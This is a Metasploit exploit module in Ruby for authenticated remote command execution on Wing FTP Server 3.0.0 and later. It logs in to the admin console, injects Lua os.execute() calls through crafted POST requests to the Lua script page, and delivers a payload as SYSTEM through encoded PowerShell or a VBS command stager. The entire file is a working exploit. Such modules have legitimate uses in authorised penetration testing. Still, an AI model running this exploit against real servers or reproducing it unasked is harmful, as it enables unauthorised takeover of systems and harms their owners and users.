##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wing FTP Server Authenticated Command Execution',
      'Description'    => %q{
        This module exploits the embedded Lua interpreter in the admin web interface for
        versions 3.0.0 and above. When supplying a specially crafted HTTP POST request
        an attacker can use os.execute() to execute arbitrary system commands on
        the target with SYSTEM privileges.
      },
      'Author'         =>
        [
          'Nicholas Nam <nick[at]executionflow.org>',
          'Imran E. Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' # minor improvements
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://www.wftpserver.com'],
          ['URL', 'https://www.wftpserver.com/help/ftpserver/index.html?administrator_console.htm']
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Wing FTP Server >= 3.0.0', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Jun 19 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(5466),
        OptString.new('USERNAME', [true, 'Admin username', '']),
        OptString.new('PASSWORD', [true, 'Admin password', ''])
      ], self.class
    )
    deregister_options('CMDSTAGER::FLAVOR')
    deregister_options('CMDSTAGER::DECODER')
    deregister_options('URIPATH')
    deregister_options('SRVHOST')
    deregister_options('SRVPORT')
  end

  @session_cookie = ''
  @version = ''
  @psh = false
  @vuln_check = false

  def check
    @session_cookie = authenticate(datastore['USERNAME'], datastore['PASSWORD'])
    if @session_cookie.nil?
      return CheckCode::Unknown
    end

    ver = send_request_cgi(
      'uri'       => '/admin_license.html',
      'method'    => 'POST',
      'cookie'    => @session_cookie,
      'ctype'     => 'text/plain;charset=UTF-8'
    )

    unless ver # cannot connect
      vprint_error("Connection failed!")
      return CheckCode::Unknown
    end

    unless ver.code == 200 && ver.get_html_document.text.to_s.include?('Wing FTP Server') # does not contain Wing FTP Server
      return CheckCode::Safe
    end

    @version = Gem::Version.new(ver.body.scan(/Wing FTP Server ([\d\.]+)/).flatten.first)
    vprint_status("Found Wing FTP Server #{@version}")

    # Lua capabilities and administrator console were added in version 3.0.0, so everything above that is vulnerable
    if @version >= Gem::Version.new('3.0.0')

      @vuln_check = true
      vuln_or_not = execute_command("PATH") # get PATH variables using os.getenv() in Lua

      unless vuln_or_not # cannot connect
        vprint_error("Connection failed!")
        return CheckCode::Unknown
      end

      unless !vuln_or_not.code == 200 && !vuln_or_not.get_html_document.text.to_s.include?("System32") # includes 'System32' in response
        if vuln_or_not.body.include?("PowerShell") # also includes 'Powershell' in response
          @psh = true
        else
          @psh = false
        end

        @vuln_check = false
        return CheckCode::Vulnerable
      end

      @vuln_check = false
      return CheckCode::Safe
    end

    @vuln_check = false
    return CheckCode::Safe
  end

  def exploit
    vprint_status("Authenticating...")
    unless [CheckCode::Vulnerable].include? check
      fail_with(Failure::NotVulnerable, 'Target is most likely not vulnerable!')
    end

    case @psh
    when true
      print_status('Executing payload via PowerShell...')
      # cmd is sent URL-encoded. Version 6.0.2 does not URL decode characters, and this causes exploit to fail.
      # Completely encode PowerShell cmd with base64 to subvert this.
      psh_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, encode_final_payload: true)
      execute_command(psh_command)
    when false
      if @version >= Gem::Version.new('6.0.2')
        print_warning("Version #{@version} detected, expect CmdStager to fail!") # CmdStager fails vs. 6.0.2
      end
      print_warning("PowerShell not found, will revert to CmdStager for payload delivery!")
      print_status("Sending payload")
      # Unfortunately, CmdStager still suffers from the "no URL decode" of version 6.0.2.
      # Recommended: don't use CmdStager versus 6.0.2.
      # Execute the CmdStager, max length of the commands is ~1500
      execute_cmdstager(flavor: :vbs, linemax: 1500)
    end
  end

  def execute_command(cmd,_opts = {})
    # Wrap cmd it with [[ ]] to prevent potential problems.
    # We also don't need to append "cmd.exe /c" for the commands
    if @vuln_check == false
      command = "os.execute([[#{cmd}]])"
    else
      command = "print(os.getenv([[#{cmd}]]))" # PATH is a good env. variable to get
    end

    res = send_request_cgi(
      'uri'       => '/admin_lua_script.html',
      'method'    => 'POST',
      'cookie'    => @session_cookie,
      'ctype'     => 'text/plain;charset=UTF-8',
      'vars_post' => { 'command' => command }
    )

    if res && res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Something went wrong.")
    end

    unless @vuln_check == false
      return res
    end
  end

  def authenticate(username, password)
    res = send_request_cgi(
      'uri'       => '/admin_loginok.html',
      'method'    => 'POST',
      'vars_post' => {
        'username'     => username,
        'password'     => password,
        'username_val' => username,
        'password_val' => password,
        'submit_btn'   => '+Login+'
      }
    )

    unless res
      print_error("#{peer} - Admin login page was unreachable.")
      return nil
    end

    if res.code == 200 && res.body =~ /location='main.html\?lang=english';/
      res.get_cookies.split(';').each do |cookie|
        cookie.split(',').each do |value|
          if value.split('=')[0] =~ /UIDADMIN/
            vprint_good("Authentication successful, got session cookie #{value.split('=')[1]}")
            return res.get_cookies.split(';')[0]
          end
        end
      end
    end

    print_error("#{peer} - Authentication failed")
    return nil
  end
end
